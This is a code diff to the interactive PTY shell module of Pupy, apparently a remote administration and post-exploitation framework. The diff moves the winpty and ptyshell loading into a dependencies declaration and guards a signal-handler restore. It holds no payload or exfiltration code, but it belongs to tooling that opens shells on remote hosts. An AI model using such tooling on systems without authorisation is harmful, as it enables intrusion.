@@ -96,6 +96,11 @@ class InteractiveShell(PupyModule):
     pipe = None
     complete = Event()
 
+    dependencies = {
+        'windows': [ 'winpty.dll', 'winpty' ],
+        'all': [ 'ptyshell' ],
+    }
+
     def __init__(self, *args, **kwargs):
         PupyModule.__init__(self,*args, **kwargs)
         self.set_pty_size=None
@@ -225,17 +230,13 @@ class InteractiveShell(PupyModule):
         sys.stdout.write('\r\nPress Enter to close to REPL\r\n')
 
     def raw_pty(self, args):
-        if self.client.is_windows():
-            self.client.load_dll('winpty.dll')
-            self.client.load_package('winpty')
-
-        self.client.load_package("ptyshell")
-
         ps = self.client.conn.modules['ptyshell'].PtyShell()
         program = None
 
         if args.program:
             program=args.program.split()
+
+        old_handler = None
 
         try:
             term = os.environ.get('TERM', 'xterm')
@@ -255,7 +256,8 @@ class InteractiveShell(PupyModule):
             self.complete.wait()
 
         finally:
-            pupylib.PupySignalHandler.set_signal_winch(old_handler)
+            if old_handler:
+                pupylib.PupySignalHandler.set_signal_winch(old_handler)
             try:
                 self.ps.close()
             except Exception:
